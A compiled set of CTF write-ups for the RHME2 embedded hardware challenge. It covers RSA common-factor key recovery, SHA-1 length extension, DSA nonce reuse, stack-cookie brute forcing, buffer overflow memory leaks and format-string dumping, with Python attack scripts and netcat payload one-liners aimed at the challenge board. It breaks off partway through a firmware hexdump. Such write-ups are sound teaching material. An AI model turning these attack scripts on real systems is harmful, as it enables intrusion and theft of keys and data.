<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-gijsh
description: CTF writeups and security challenges by gijsh.
---

# Writeups by gijsh

Source repository: `/repos/gijsh`

## Repository Index

- rhme2_writeups/README.md
- rhme2_writeups/crypto/README.md
- rhme2_writeups/exploit/README.md
- rhme2_writeups/fridgejit/README.md
- rhme2_writeups/reversing/README.md
- rhme2_writeups/sca/README.md

## Writeup Content


### File: rhme2_writeups/README.md

# Introduction

From November 2016 till February 2017 Riscure ran the 'first embedded hardware CTF, round two.' also called RHME2. RHME2 is a hardware based CTF where Riscure ships each participant an Arduino Nano board containing a custom bootloader that can be used to flash encrypted challenges to the board. These challenges need to be solved using various hardware and software techniques.

I participated in this CTF and got second place after the HydraBus team. This repository contains [my](https://twitter.com/gijs_h) writeups for the [Riscure RHME2](http://rhme.riscure.com/) Challenge.

# Writeups

The writeups are split up per category:

* [Exploitation](exploit/README.md)
* [Reversing](reversing/README.md)
* [Side channel analysis](sca/README.md)
* [Crypto](crypto/README.md)
* [Fault injection](fi/README.md)
* [Misc](misc/README.md)
* [FridgeJIT](fridgejit/README.md)

# Interfacing with the board

There are various ways to interface with the board. The technique I used almost everywhere is to create a TCP to serial bridge using [socat](http://www.dest-unreach.org/socat/) and then interfacing over TCP, mostly using hellman's [sock.py library](https://github.com/hellman/sock). Most of the exploit code in this repository assumes that there is a socat TCP to serial bridge running on port 1235. If you want to try the exploits the following socat command can be used to run this bridge:

```
socat -v -x file:/dev/ttyUSB0,b19200,raw tcp-listen:1235,reuseaddr
```


### File: rhme2_writeups/crypto/README.md

# Crypto 200 - Key Server

The following description is given for this challenge:

> We have received a portable asymmetric key storage for evaluation purposes. 
> This portable device was manufactured by Ebian Corp to facilitate secure communications with customers. It generates and stores adminstrators' public keys. 
> Customers can use this repository to find the public key of the admin they want to contact, and administrators can use this repository to update their key information. 
> If this fancy keychain passes the test we are going to give them away like candy, secure candy.


Interacting with the board yields the following:

```
Ebian Corp has a repository to store its adminstrators' public keys.
1)If you are a customer you can list all the public keys.
2)If you are an admin you can update your keys.
Just sign the plaintext "admin" and more options will be provided.
The parameters to be used for the signature are SHA1 and PKCS1_v1_5
1
Public Key List:
Alice:
00c90e4c65c0a96080df5aaf73caaf1146afb364cb37894f6bb745182191bf577a2777d8b5dbf57b2ad9f902e2d3abadfe6ebeb7366d7b11f0cbfd4371dbadf5f548e60644b3365a654b8efe2de32bbb1cc0288d367c0e8cf9ac8a2544cb067f677c87e82362e3b3ce950d072c5b1baffd650a31db4ff7d7209f0aec0178d7ba8b
Bob:
00db87e4a4774c4c4606faadeb58460d6c62282aced115ae9d256d6ca2d32b49615c9257869aa0b1757b8faaae401f94474ddbf5f54b75dfaa7bef370cc9842a920ff9484cabacece44e7c2c80c2c97775a39d035c59475db93374cbac0d0e4f0830bcc51fe4680ef1d8afce89d61ef7a1fe8f03dd26a7049303f1cbfa94b10323
Carl:
00a8e4fe8ddca1a4b8c97376d90e43e78f9df822412215511fa3efc3f96b34c6bdc2090dbbfce2e118ff8168c6ba1ed965f743238467310c97d22918c4549d9c426641469a57ed75557367ad37d3c73485a5d748bbcea211897f72f60e7fbd6bb220e6e56e466dcc3144abb78388865ee5c9bba879ea96c0a2522bdb63383f3591
David:
00b7a2434673e546ff4d7975166a5228e19aa5b43ab79e147f27695aeeeb197bb3152ef1df0b8190a7304b4db49cffdf6f0cdd168f47594d2fd0672787716ae519bf78df1cb96c0968785e7f0ec7de1008644b3cc32c74748f0d0967cdc76b7bba0cb78a15858bcc40063e53c34bb47cf63ba2eb8af3d491131f2aa96388802677
Edward:
00b7882ac1f039ce5c9cef7a66800d2247c465cd5bcbaa80cc48ba34ec2759280a666432f78f53d222a308ea2dc7d455be7d050faeca3fd9847fb43dbaf2a09013778e238b7a79430271c105cb959f3ff4d0e72a756ecc948bc27e1b1dc7dafb3fae6e31c2571c89f06ac854cac98d10e106ec89abd4d093f28e13db54ea8798b3
Fleur:
00cec274724b04bda96d51162abf710fbf1eedb978aa87639e61a166b772cf4bdfc8fdddb3b700b366d68767a5d33cce4e6146fe325de5d9d0dc480dbd4201c3859d1debbf952a1e3a10c0cfeb6413f740748c7a43a346d895c12bf7b14068df33be376b12527b1c7fb390f95d0f878ebb8a38c621eb415a85bf42b9cbcaccc749
Gary:
00bdb08ad1d97628b0d4e9bdcdb0303007e66b9d82b3ca3e7df476911f1d0ffd81f67487b4fafc4e252b30c501055335ab74f1e92e411615b5263d5117daf715740f826a6f8faba2620ddda2852a3595aa9f051d3e0b46766440360f986cc2db7b7f2d9431e9324280109ac1ed43900a57531ee2878e895c6f5b4ba4311051413d
```

The board provides 6 RSA public keys and asks us to sign something. The first thing that comes to mind if that it might be possible to obtain a private key because two of the public keys share a common factor. To try this out we simply need to calculate the GCD between all pairs of keys.

If we do this indeed we see that Bob's and Gary's key both share a common factor:

```
12740687396952811643088941494602600474970968740910907077064852670904845297490889090164936902229457369083527167233513652960298164731764863857925799725451573
```

Wrote a script to obtain the signature: [key_server.py](key_server.py)

Once the signature has been obtained we can send it to board, to make things a bit annoying it only accepts it if we use \r as EOL:

```
hackbox:crypto1:% python key_server.py
Found common factor in db87e4a4774c4c4606faadeb58460d6c62282aced115ae9d256d6ca2d32b49615c9257869aa0b1757b8faaae401f94474ddbf5f54b75dfaa7bef370cc9842a920ff9484cabacece44e7c2c80c2c97775a39d035c59475db93374cbac0d0e4f0830bcc51fe4680ef1d8afce89d61ef7a1fe8f03dd26a7049303f1cbfa94b10323
Signature for admin: 43b3d362a0683e0ec7ddde2b0748276bafcd03d8933299dd672765290b106be710ef26a7154eaf1f6805f1ea812b65faab1393f300f28b460070d68c420f4c5326b4d65e486887453d6b74cc7daae2755687701f7708c41f8d2a1380ab8a142fa4991a8e1e58ab6c675778203ea5e3f5f064c0c0500477ef373a5a4607d7e0e3
hackbox:crypto1:% (sleep 1; echo -en '2\r'; sleep 1; echo -en '43b3d362a0683e0ec7ddde2b0748276bafcd03d8933299dd672765290b106be710ef26a7154eaf1f6805f1ea812b65faab1393f300f28b460070d68c420f4c5326b4d65e486887453d6b74cc7daae2755687701f7708c41f8d2a1380ab8a142fa4991a8e1e58ab6c675778203ea5e3f5f064c0c0500477ef373a5a4607d7e0e3\r') | nc 127.0.0.1 1235
Ebian Corp has a repository to store its adminstrators' public keys.
1)If you are a customer you can list all the public keys.
2)If you are an admin you can update your keys.
Just sign the plaintext "admin" and more options will be provided.
The parameters to be used for the signature are SHA1 and PKCS1_v1_5
Enter the signature
FLAG:cf2194c3103a2b2c69b5be67e6b10bff
```


# Crypto 100 - Secure Filesystem

The following description is given for this challenge:

> We don't remember why, but we wanted a file system on an AVR328p. After the system was completed we discovered that it lacked basic security. A couple of beers later we came up with what we think is a revolutionary way to do file system permissions. It is now your task to fill in our shoes and test its security.
> 
> The filesystem allows you to request the contents of one or more available files by using the following
> format:
> 
> token#<filename>[:<filename>]
> 
> So for example, a request would be:
> 
> 933d86ae930c9a5d6d3a334297d9e72852f05c57#cat.txt:finances.csv
> 
> Some example files (token | call):
> 
> 96103df3b928d9edc5a103d690639c94628824f5 | cat.txt
> 933d86ae930c9a5d6d3a334297d9e72852f05c57 | cat.txt:finances.csv
> 83f86c0ba1d2d5d60d055064256cd95a5ae6bb7d | cat.txt:finances.csv:joke.txt
> ba2e8af09b57080549180a32ac1ff1dde4d30b14 | cat.txt:joke.txt
> 0b939251f4c781f43efef804ee8faec0212f1144 | finances.csv
> 4b0972ec7282ad9e991414d1845ceee546eac7a1 | finances.csv:joke.txt
> 715b21027dca61235e2663e59a9bdfb387ca7997 | joke.txt
> 
> Can you access any file you're not supposed to?

Interacting with the board yields the following:

```
RHMeOS file API
Files in system:

drwxrwxr-x remote remote 4096 sep  1 .
drwxrwxr-x remote remote 4096 sep  1 ..
-r--r--r-- remote remote   87 sep 14 cat.txt
-r--r--r-- remote remote   47 sep 16 finances.csv
-r--r--r-- remote remote    3 sep 14 joke.txt
-rw------- root   root     37 jan  5 passwd
-rw------- root   root      8 jan  1 pepper

 Request?
```

We can indeed enter one of the example requests shown in the challenge description and get, for example, the file cat.txt:

```
>> 96103df3b928d9edc5a103d690639c94628824f5#cat.txt

 cat.txt:
  A_A
 (-.-)
  |-|
 /   \
|     |   __
|  || |  |  \__
 \_||_/_/

```

Looking at the input string the first thing that comes to mind is a hash length extension attack. The provided hash values are 40 hex characters = 160 bits in length. This could be SHA-1. We can use standard tools like [hashpump](https://github.com/bwall/HashPump) to perform the length extension attack on SHA-1. The only thing required to perform this attack is the length of the secret prefix. We can write a simple script to try all possible values for this length.

See [file_server.py](file_server.py) for the implemented solution.

Running this provides the flag for prefix length 8

```
8

 passwd:
FLAG:2bdb3e0df152165690fd099eda0f6529
```

# Crypto 150 - Secure Filesystem v1.92r1

The following description is given for this challenge:

> After the horrible debacle of the first file system, we got together again, invited our friend Mr. Wodka and waterproofed the secure file system. You can test it again, but this time it uses unbreakable encryption.
> 
> The filesystem allows you to request the contents of one or more available files by using the following
> format:
> 
> token#<filename>[:<filename>]
> 
> So for example, a request would be:
> 
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a3a3a9b3cc5239fdf4572157296903a0237a4aaeeaa8f3d15#joke.txt
> 
> Some example files (token | call):
> 
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> dfd0f4a25b7d529e89ac030c2b681e93831e95a8186823b9 | cat.txt
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> f2bca35d472116dc6d5bebe96f1a3af249be78c63219a0dc | cat.txt:finances.csv
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> 7eed666977d3861dbaefd16b2ed7dc5b639e51853ca6e7b3 | cat.txt:finances.csv:joke.txt
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> 51d915246394ce976f8768cf3300087cb5b9958bbec30f9c | cat.txt:joke.txt
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> ae2a5a38b4d03f0103bce59874e41a0df19cb39b328b02fa | finances.csv
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> c66b5e48f5e600982724eca3804fb59b7b0f395a6e17e1ce | finances.csv:joke.txt
> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a |
> 3a3a9b3cc5239fdf4572157296903a0237a4aaeeaa8f3d15 | joke.txt
> 
> Can you access any file you're not supposed to?

Interacting with the board yields the following:

```
RHMeOS file API V1.92r1
Files in system:

drwxrwxr-x remote remote 4096 sep  1 .
drwxrwxr-x remote remote 4096 sep  1 ..
-r--r--r-- remote remote   87 sep 14 cat.txt
-r--r--r-- remote remote   47 sep 16 finances.csv
-r--r--r-- remote remote    3 sep 14 joke.txt
-rw------- root   root     37 jan  5 passwd
-rw------- root   root      8 jan  1 pepper

 Request?
```
 
 We can indeed enter one of the example requests shown in the challenge description and get, for example, the file cat.txt:

```
>> 897703036b2e18116b36353d92ac3dd978845fc99a735b8adfd0f4a25b7d529e89ac030c2b681e93831e95a8186823b9#cat.txt

 cat.txt:
  A_A
 (-.-)
  |-|
 /   \
|     |   __
|  || |  |  \__
 \_||_/_/

```

One thing that stands out is that this takes a very long time (about 10 seconds) this might indicate that a more complex algorithm is being used this time.

Also it is noted that for all requests two large numbers are provided. This matches with the [DSA algorithm](https://en.wikipedia.org/wiki/Digital_Signature_Algorithm) where a signature consists of a random number r and a signature s. 

It is a known problem that if the same random number r is used multiple times this can be used to obtain the private key.

However to perform this attack we first need to know a parameter called q which is a large random prime number. This parameter is not provided in the challenge text.

The trick to obtaining q is by reading the standard Wikipedia pseudo-code for signature validation which starts with the step: ```Reject the signature if 0 < r < q or 0 < s < q is not satisfied.```

We can use this perform a binary search on the value of q simply by trying various values for r and seeing if they are accepted (meaning the guess is smaller than q) or rejected (meaning the guess is larger or equal to q).

The following script implements the binary search:

```
import time
from sock import Sock

mi = 0x000000000000000000000000000000000000000000000000
ma = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
s = Sock('127.0.0.1',1235)
print s.read_until('>> ')
while True:
    pivot = (mi + ma) / 2
    print (mi, ma)
    msg = '%.48X%.48X#bier' % (pivot,pivot)
    print '%.48X' % (pivot)
    t = time.time()
    s.send(msg + '\r\n')
    reply = s.read_until('>> ', timeout=20)
    print repr(reply)
    delta = time.time() - t
    if delta > 5: # q = larger than pivot
        mi = pivot
        print delta, "guess too low or correct"
    else:
        ma = pivot
        print delta, "guess too high"
```

The value for q is recovered as: 0xFFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22831

We can now implement the standard DSA re-used r attack. Refer to [securefs_192.py](securefs_192.py)

This correctly computes the checksum for passwd:

```
hackbox:crypto3:% python solve.py
897703036b2e18116b36353d92ac3dd978845fc99a735b8a14c4c3df4f358d1c55bbd35f30543f80ea6b7f3cdb27eac0#passwd
hackbox:crypto3:% ncat -C 127.0.0.1 1235


RHMeOS file API V1.92r1
Files in system:

drwxrwxr-x remote remote 4096 sep  1 .
drwxrwxr-x remote remote 4096 sep  1 ..
-r--r--r-- remote remote   87 sep 14 cat.txt
-r--r--r-- remote remote   47 sep 16 finances.csv
-r--r--r-- remote remote    3 sep 14 joke.txt
-rw------- root   root     37 jan  5 passwd
-rw------- root   root      8 jan  1 pepper

 Request?

>> 897703036b2e18116b36353d92ac3dd978845fc99a735b8a14c4c3df4f358d1c55bbd35f30543f80ea6b7f3cdb27eac0#passwd

 passwd:
FLAG:4da3a36299a658148d8d1f23aeed4827
```


### File: rhme2_writeups/exploit/README.md

# Exploitation 100 - Photo Manager

The following description is given for this challenge:

> We have recently been informed that a group of hackers exploited a vulnerability in a PC within another very secure network. Our operative says the hacker in charge took a snapshot of the password, which they stored in their secret hidden-away database.
> 
> Today we found a photo manager service running on the internet. This service can be linked to the hacker who retrieved the passwords. From the size of the photo manager we can see they stored lots of pictures, so we are hoping they stored the password on their photo manager too. Can you breach their photo manager and take a quick look?
> 
> Keep in mind that the flag is 32 characters long and you should disregard the last ‘1’.

Interfacing with the board provides the following:

```
[1] Login
[2] Memory management
1
Please authenticate yourself with your hardware token
Please insert token. (8 characters)
Token can only contain the characters [A-Z/a-z/0-9]

AAAAAAAA
Welcome AAAAAAAA
```

When providing a very long name an error message about a corrupt stack cookie appears:

```
Please authenticate yourself with your hardware token
Please insert token. (8 characters)
Token can only contain the characters [A-Z/a-z/0-9]

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Stack cookie corrupted.
```

So it appears that there is a buffer overflow in the reading of the token value. The next step is to find the size of the buffer and identify how many A's have to be sent to get the cookie corrupted message.

Some quick and dirty code to run the memory usage function and then find the number of A's to send to trigger the cookie corrupted message:

```
from sock import Sock
s = Sock('127.0.0.1',1235)
s.read_until('[2] Memory management\r\n')
s.send('2\r')
reply = s.read_until('[2] Memory management\r\n')
print reply.split('\r\n')[1]
for x in range(1, 128):
    s.send('1\r')
    r = s.read_until('Token can only contain the characters [A-Z/a-z/0-9]\r\n')
    s.send(('A' * x) + '\r')
    r = s.read_until('[2] Memory management\r\n')
    if 'cookie' in r:
        print x, "Cookie corrupted"
        exit()
```

Running this a few times yields different results:

```
hackbox:exploit1:% python l.py
Memory space used: 3992 bytes
97 Cookie corrupted
hackbox:exploit1:% python l.py
Memory space used: 3979 bytes
110 Cookie corrupted
hackbox:exploit1:% python l.py
Memory space used: 3997 bytes
92 Cookie corrupted
```

Each time the exploit runs a different amount of memory space is used and also the number of A's that need to be sent to overwrite the stack cookie differ. After some puzzling it turns out that the number of A's that need to be sent is equal to 4089 - memory space used. The last A sent then overwrites the stack cookie.

Now we know how to calculate the number of A's required to reach the stack cookie we can try to brute-force the stack cookie value, trying all values for the first byte of the stack cookie.

```
from sock import Sock
s = Sock('127.0.0.1',1235)
l = 0
s.read_until('[2] Memory management\r\n')
s.send('2\r')
r = s.read_until('[2] Memory management\r\n')
used = int(r.split('\r\n')[1].split()[-2])
i = 4088 - used
print "Stack cookie is at offset: %s" % i

cookie = ''
for x in range(60,256):
    s.send('1\r')
    s.read_until('Token can only contain the characters [A-Z/a-z/0-9]\r\n\r\n')
    if not cookie:
        d = 'A'*i
        s.send(d + cookie + chr(x) + '\r')
        o = s.read_line()
        print "Bruting cookie", i, x, repr(o)
        if 'Welcome' in o:
            cookie += chr(x)
            print "Cookie found: ", repr(cookie)
            break
    r = s.read_until('[2] Memory management\r\n')
```

Now the value of the stack cookie can be brute-forced. And we can overwrite memory. Next step is to figure out what to overwrite.

If we overwrite one byte after the stack cookie, for example with chr(16) we get a new error:

```
The length is not equal to 8 anymore. It is found to be 16 now.
```

Aparently the memory we overwrite looks something like this:
`<name_buffer><cookie><length><something>`

The next character after the length seems to be ignored, any value written yields the same output (Welcome name).

So we continue to the next character. Now the output becomes interesting, we get a lot of 'Hardware tokens are not of given ASCII sub-set' messages but after a while we start seeing parts of the name returned at an offset instead of at the start, for example:

```
0x55 'Welcome ABCDEFGH\r\n[1] Login\r\n[2] Memory management\r\n'
0x56 'Welcome BCDEFGHI\r\n[1] Login\r\n[2] Memory management\r\n'
0x57 'Welcome CDEFGHIJ\r\n[1] Login\r\n[2] Memory management\r\n'
0x58 'Welcome DEFGHIJK\r\n[1] Login\r\n[2] Memory management\r\n'
```

It appears we are dumping memory, a while later the following appears:
```
0xcf 'Welcome 626f9787\r\n[1] Login\r\n[2] Memory management\r\n'
0xd0 'Welcome 26f97879\r\n[1] Login\r\n[2] Memory management\r\n'
0xd1 'Welcome 6f978792\r\n[1] Login\r\n[2] Memory management\r\n'
0xd2 'Welcome f978792a\r\n[1] Login\r\n[2] Memory management\r\n'
0xd3 'Welcome 978792af\r\n[1] Login\r\n[2] Memory management\r\n'
0xd4 'Welcome 78792afd\r\n[1] Login\r\n[2] Memory management\r\n'
```

This looks an awful lot like a flag. Changing the code to dump only this part we get the flag. See final solution in [photo.py](photo.py).

```
hackbox:exploit1:% python photo.py
Stack cookie is at offset: 89
Cookie found:  'Y'
FLAG: 626f9787
FLAG: 626f978792afd3e8
FLAG: 626f978792afd3e8f30801c3
FLAG: 626f978792afd3e8f30801c3aa126d98
```

# Exploitation 200 - Animals
The following description is given for this challenge:

> After decades of research, we have finally managed to catalogue all the animals on the planet earth. Including very rare pictures!

After the flashing the challenge to the board the following is shown:

```
Show me a

 [c]at
 [d]og
 [m]ouse

>>c

This is a c
   A_A
  (-.-)
   |-|
  /   \
 |     |   __
 |  || |  |  \__
  \_||_/_/

```

It appears that the input is echoed back, for example if you type in ```catplz!!``` it will echo back: ```This is a catplz!!```.

After trying some %x and similar to no avail I started looking for a buffer overflow, by trying inputs of various lengths to see if something strange happened:

```
from sock import Sock
import hexdump
s = Sock('127.0.0.1',1235)
s.read_until('>>')
for x in range(0,255):
    s.send(('c'*x) + '\r\n')
    reply = s.read_until('>>').split('\r\n')[1]
    print x
    hexdump.hexdump(reply.replace('This is a ',''))
``` 

By sending 11 c's something strange happens indeed:

```
00000000: 63 63 63 63 63 63 63 63  63 63 63 00 5E 01 68 00  ccccccccccc.^.h.
00000010: 00 01 00 00 58 01 69 01  00 01 00 00 52 01 6A 02  ....X.i.....R.j.
00000020: 00 01 00 00 4C 01 6B 03  00 01 00 00 00 00 00 00  ....L.k.........
00000030: 00 00 00 00 00 00 00 00  00 00 00 00              ............
```

The program appears to leak some memory. It turns out the 11th byte of input over-writes the length of the output. If we send ```'c'*10 + chr(1)``` we get back only 1 character of output. If we send ```'c'*10 + chr(0xff)``` we get back the following output:

```
00000000: 63 63 63 63 63 63 63 63  63 63 FF 00 5E 01 68 00  cccccccccc..^.h.
00000010: 00 01 00 00 58 01 69 01  00 01 00 00 52 01 6A 02  ....X.i.....R.j.
00000020: 00 01 00 00 4C 01 6B 03  00 01 00 00 00 00 00 00  ....L.k.........
00000030: 00 00 00 00 00 00 00 00  00 00 00 00              ............
```

Another interesting observation is that if we send ```'c'*12``` we get a cat back but for ```'c'*13``` we don't. The strange thing is that for d we keep getting the dog for ```'d'*20``` but not any more for ```'d'*21```

If we correlate this to the dumped memory we can see the following:

```
Bytes 0-9   63 63 63 63 63 63 63 63  63 63                   cccccccccc = input
Byte 10     FF                                               .          = length
Bytes 12-19 5E 01 68 00 00 01 00 00                          ^.h.....   = cat
Bytes 20-27 58 01 69 01 00 01 00 00                          X.i.....   = dog
Bytes 28-35 52 01 6A 02 00 01 00 00                          R.j.....   = mouse
Bytes 36-43 4C 01 6B 03 00 01 00 00                          L.k.....   = ?
```

So there appear to be 4 8 byte data structures representing the animals. 3 of these we already know but there is a fourth one. The exploit is to overwrite the cat data-structure with that of the unknown animal and then display a cat. Refer to [animals.py](animals.py) for the full exploit.

```
hackbox:exploit2:% python animals.py

This is a cccccccccccLkXiRjLk

FLAG:
c18a2a667c8b37b7
0fe176461133f323
      /
     /
  ___\______
 / ___  ___ \
/ / @ \/ @ \ \
\ \___/\___/ /\
 \____\/____/||
 /     /\\\\\//
 |     |\\\\\\
  \      \\\\\\
   \______/\\\\
    _||_||_
     -- --
```

If you want to be cool, this can even be solved with a one-liner:

```
hackbox:exploit2:% echo '6363636363636363636363014c016b03000100000d0a' | xxd -r -p | nc 127.0.0.1 1235 | grep -a -A2 FLAG
FLAG:
c18a2a667c8b37b7
0fe176461133f323
```


# Exploitation 150 - Casino

The following description is given for this challenge:

> Welcome to our casino, Riscure Royale! Please enjoy your stay by playing a game, or drink something at our bar. Reach 1000 credits and you will be rewarded with a special prize.
> 
> We have seen loads of cheaters lately, so we have extra guards walking around. Do not feel threatened by them, they will only kick out the people that cheat. Of course, once you earn a lot of money they will start investigating the matter. Better spend some money at our bar if this happens.
> 
> PS. We all know casinos are scams.

After the flashing the challenge to the board the following is shown:

```
Welcome to the casino!
Get a currency of 1000 and we give you the secret key.
Occasionally we give away coupons for free drinks.
We have guards walking around, looking for cheaters.
Don't get caught cheating. We will take our currency back.

Current balance: 50
Amount of coupons left: 0

[1] Play
[2] Cheat
[3] Go for a drink at the bar
[4] Give me some free money
[5] Restart
```

After playing around with this manually for a while I noticed that if you just keep pressing enter (not making a choice in the menu) at some point you get a coupon that can be used to get a free drink.

```
We appreciate your stay here.
To show our gratitude we give you a coupon for a free drink

Current balance: 50
Amount of coupons left: 1
```

Now menu option 3 is available and can be used to buy a drink:
```
What would you like to drink?
```

The text that is entered is echoed back to the screen. If we include a format string character (like %x) it is evaluated.

For example entering test %x %x yields the following output

```test 6574 7473```

The values echoed back (6574 7473) correspond to the input (test) in little endian format. This means that the input string can be referenced as the first format string argument. Using this memory can be dumped by providing an address followed by %s. This will dump memory until the first 0-byte string terminator is encountered.

Implemented a small [memory dumper](casino.py) which is able to dump memory using the format string exploit. At address 0x117 the flag can be found:

```
0x117
00000000: 46 4C 41 47 3A 61 30 65  36 66 32 38 63 31 34 33  FLAG:a0e6f28c143
00000010: 32 64 65 64 36 62 38 33  39 36 61 34 31 34 33 64  2ded6b8396a4143d
00000020: 37 65 36 30 64 00                                 7e60d.
```

# Exploitation 400 - Weird Machine

Refer to the [FridgeJIT](fridgejit/README.md) section.



### File: rhme2_writeups/fridgejit/README.md

# Introduction

The RHME2 CTF contained a number of challenges that were linked together based on the theme of a IOT enabled Fridge that allows customers to run their own code. This section details my solutions for these 'Fridge' related challenges.

# Reverse Engineering 400 - FridgeJIT

The following description is given for this challenge:

> A senior technical manager of a fridge manufacturer demanded the ability to update the firmware in their new product line (we need to monitor and control the temperature, right?) of all deployed devices over the air and without user interaction. This way, the manufacturer could improve the user experience by providing firmware updates, even when the fridge is 1 or 2 years old.
> 
> It turned out that the CPU that comes with the fridges does not allow self-upgrading the firmware, so the developers built a VM for the fridge software which at that time was just a few lines of code. Incidentally, half of the development and test team was fired 2 months after releasing the new product line.
> 
> A crafty customer has been able to reverse engineer the software and programmed the fridge with different software. His goal was to build a digital safe, but the guy claims not being able to make the application small enough to fit inside the VM. However, to be sure we ask you to check whether this is correct.
> 
> Are you able to crack the password? We have been able to extract the full firmware image of a slightly different fridge and a memory dump of their fridge. We hope this is enough...
> 
> Note: The flag is in a different format than usually...

Apart from the encrypted firmware to be flashed on the board 2 other files are provided: 

* firmware.bin - the unencrypted firmware
* memory.dmp - memory dump

The first step in solving this challenge is to understand what the firmware does.

The same tools and techniques described in the [reversing](../reversing/README.md) section can be applied to create a firmware version suitable for use in the simduino emulator that can be debugged using avr-gdb.

Interacting with the challenge yields the following:

```
Loader> Authentication failed
Loader> Provide bootrom (hex encoded)
Loader>
```

After doing some initial reversing I found out the following:

* You can provide a hex encoded firmware file to the device this is then executed in a custom VM emulator
* The firmware is read to memory address 0x2b8
* The length of the program is stored on memory address 0x05c1
* A built-in debugger is provided

Using this information in combination with the memory dump we can obtain some information on the program that was running inside the VM when the memory dump provided was made.

```
import struct, hexdump
f = open('memory.dmp').read()
pay_len = struct.unpack("<H", f[0x05c1:0x05c1+2])[0]
print "Payload length: %s" % pay_len
payload = f[0x2b8:0x2b8+pay_len]
print "Payload:"
hexdump.hexdump(payload)
```

This outputs the firmare length and the firmware:

```
% python dump_program.py
Payload length: 672
Payload:
00000000: 05 00 25 00 04 00 20 3A  01 00 05 00 64 72 04 00  ..%... :....dr..
00000010: 6F 77 01 00 05 00 73 73  04 00 61 50 01 00 04 50  ow....ss..aP...P
00000020: 00 88 12 50 03 06 04 10  00 0A 04 50 00 A8 12 50  ...P.......P...P
00000030: 04 50 01 20 12 50 67 C6  05 40 FF FF 04 40 FF EE  .P. .Pg..@...@..
00000040: 0D 20 16 24 18 00 12 13  04 50 00 50 12 50 69 73  . .$.....P.P.Pis
00000050: 0A 11 04 10 00 0A 05 00  45 00 04 00 21 74 01 00  ........E...!t..
00000060: 05 00 63 65 04 00 72 72  01 00 05 00 6F 63 04 00  ..ce..rr....oc..
00000070: 6E 49 01 00 03 06 04 50  00 A8 0A 44 12 50 14 00  nI.....P...D.P..
00000080: 21 00 00 00 14 00 21 51  04 10 00 04 04 50 00 A8  !.....!Q.....P..
00000090: 1D 18 00 26 13 FF 4A EC  05 00 21 72 04 00 72 45  ...&..J...!r..rE
000000A0: 01 00 03 06 12 50 1F 29  01 20 00 00 16 14 18 00  .....P.). ......
000000B0: 2D 02 20 13 06 20 1C 20  04 30 00 01 08 03 09 13  -. .. . .0......
000000C0: 14 00 2B CD 0A 22 01 00  01 10 04 50 00 88 12 50  ..+..".....P...P
000000D0: 04 50 00 01 03 06 08 01  06 00 00 00 16 04 18 00  .P..............
000000E0: 3B 04 40 00 00 08 61 08  61 13 BA AB 1B 30 07 23  ;.@...a.a....0.#
000000F0: 08 25 09 05 14 00 37 F2  0A 11 04 10 00 08 05 00  .%....7.........
00000100: 20 74 04 00 63 65 01 00  05 00 72 72 04 00 6F 43   t..ce....rr..oC
00000110: 01 00 03 06 04 50 00 A8  0A 44 12 50 1F FB E3 46  .....P...D.P...F
00000120: 04 00 00 11 04 50 00 C4  12 50 04 30 00 02 04 50  .....P...P.0...P
00000130: 00 38 12 50 04 50 01 8C  12 50 18 00 61 04 50 01  .8.P.P...P..a.P.
00000140: B0 12 50 18 00 61 04 50  01 CC 12 50 18 00 61 04  ..P..a.P...P..a.
00000150: 50 02 0C 12 50 18 00 61  04 50 02 34 12 50 18 00  P...P..a.P.4.P..
00000160: 61 04 50 02 5C 12 50 18  00 61 04 50 02 70 12 50  a.P.\.P..a.P.p.P
00000170: 18 00 61 04 50 02 88 12  50 18 00 61 04 50 00 F8  ..a.P...P..a.P..
00000180: 12 50 7C C2 04 50 00 50  12 50 54 F8 04 50 00 88  .P|..P.P.PT..P..
00000190: 12 50 06 40 0D 20 10 42  05 10 3D 67 04 10 82 A5  .P.@. .B..=g....
000001A0: 0A 41 05 10 5D D5 04 10  3C 4F 16 14 13 1B E8 E7  .A..]...<O......
000001B0: 08 03 06 40 05 10 23 25  04 10 DB F8 08 41 05 10  ...@..#%.....A..
000001C0: 53 6D 04 10 3B 6D 16 14  13 8D 76 5A 08 03 06 40  Sm..;m....vZ...@
000001D0: 0A 22 04 10 00 10 04 50  00 54 0E 51 0C 25 04 10  .".....P.T.Q.%..
000001E0: 00 00 04 50 00 47 0E 51  0C 25 04 10 00 08 04 50  ...P.G.Q.%.....P
000001F0: 00 30 0E 51 0C 25 04 10  00 18 04 50 00 5F 0E 51  .0.Q.%.....P._.Q
00000200: 0C 25 09 42 0A 22 16 24  11 51 13 2E 04 50 E2 BD  .%.B.".$.Q...P..
00000210: 08 03 06 40 05 50 20 59  0C 15 0A 41 0A 55 04 50  ...@.P Y...A.U.P
00000220: BD E9 09 45 04 50 00 10  11 45 04 50 07 4C 09 45  ...E.P...E.P.L.E
00000230: 16 24 13 63 04 50 00 88  12 50 08 03 06 40 04 50  .$.c.P...P...@.P
00000240: 00 13 11 45 05 10 38 15  04 10 CF B2 10 15 0A 41  ...E..8........A
00000250: 05 10 93 17 04 10 EE E5  16 14 13 33 08 03 06 40  ...........3...@
00000260: 09 41 05 20 D4 19 04 20  83 7A 16 24 13 9F C9 9A  .A. ... .z.$....
00000270: 08 03 06 40 08 12 09 14  11 10 05 40 B2 EF 04 40  ...@.......@...@
00000280: 2C 90 16 14 13 66 32 0D  08 03 06 40 0A 40 0A 41  ,....f2....@.@.A
